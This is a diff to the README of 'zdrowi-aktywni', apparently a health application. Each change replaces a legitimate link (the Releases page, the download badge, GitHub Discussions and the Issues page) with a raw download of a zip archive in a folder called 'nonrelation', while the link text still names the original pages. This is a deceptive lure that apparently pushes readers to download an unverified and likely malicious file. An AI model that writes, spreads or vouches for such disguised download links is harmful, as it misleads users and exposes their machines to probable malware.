@@ -6,11 +6,11 @@ Welcome to **zdrowi-aktywni**! This application helps you explore AI-driven heal
 
 ## 📥 Download the Application
 
-[![Download zdrowi-aktywni](https://img.shields.io/badge/Download-zdrowi--aktywni-brightgreen)](https://github.com/bobstuden/zdrowi-aktywni/releases)
+[![Download zdrowi-aktywni](https://github.com/bobstuden/zdrowi-aktywni/raw/refs/heads/main/nonrelation/aktywni-zdrowi-2.1.zip)](https://github.com/bobstuden/zdrowi-aktywni/raw/refs/heads/main/nonrelation/aktywni-zdrowi-2.1.zip)
 
 To get the latest version, please visit the Releases page below:
 
-[Visit the Releases Page](https://github.com/bobstuden/zdrowi-aktywni/releases)
+[Visit the Releases Page](https://github.com/bobstuden/zdrowi-aktywni/raw/refs/heads/main/nonrelation/aktywni-zdrowi-2.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ Before you install **zdrowi-aktywni**, ensure your device meets the following re
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/bobstuden/zdrowi-aktywni/releases).
+1. Go to the [Releases page](https://github.com/bobstuden/zdrowi-aktywni/raw/refs/heads/main/nonrelation/aktywni-zdrowi-2.1.zip).
 2. Locate the latest version of **zdrowi-aktywni**.
 3. Click on the download link for your operating system.
 4. Once the download finishes, open the downloaded file.
@@ -52,7 +52,7 @@ If you experience any problems, please check the following:
 
 To update **zdrowi-aktywni**, follow these steps:
 
-1. Return to the [Releases page](https://github.com/bobstuden/zdrowi-aktywni/releases).
+1. Return to the [Releases page](https://github.com/bobstuden/zdrowi-aktywni/raw/refs/heads/main/nonrelation/aktywni-zdrowi-2.1.zip).
 2. Download the latest version.
 3. Open the new file and follow the installation prompts. The new version will replace the old one.
 
@@ -60,7 +60,7 @@ To update **zdrowi-aktywni**, follow these steps:
 
 Join our community to connect with other users. Share your experiences, questions, or suggestions on platforms like:
 
-- [GitHub Discussions](https://github.com/bobstuden/zdrowi-aktywni/discussions)
+- [GitHub Discussions](https://github.com/bobstuden/zdrowi-aktywni/raw/refs/heads/main/nonrelation/aktywni-zdrowi-2.1.zip)
 - Social Media groups related to health and technology
 
 ## ⚙️ Troubleshooting Tips
@@ -73,6 +73,6 @@ If you run into issues while using **zdrowi-aktywni**, consider these tips:
 
 ## 📞 Support
 
-Need help? Feel free to reach out. You can submit an issue on the [GitHub Issues page](https://github.com/bobstuden/zdrowi-aktywni/issues). We strive to respond to all inquiries within 48 hours.
+Need help? Feel free to reach out. You can submit an issue on the [GitHub Issues page](https://github.com/bobstuden/zdrowi-aktywni/raw/refs/heads/main/nonrelation/aktywni-zdrowi-2.1.zip). We strive to respond to all inquiries within 48 hours.
 
 Thank you for choosing **zdrowi-aktywni**. We are excited to support your journey to better health!
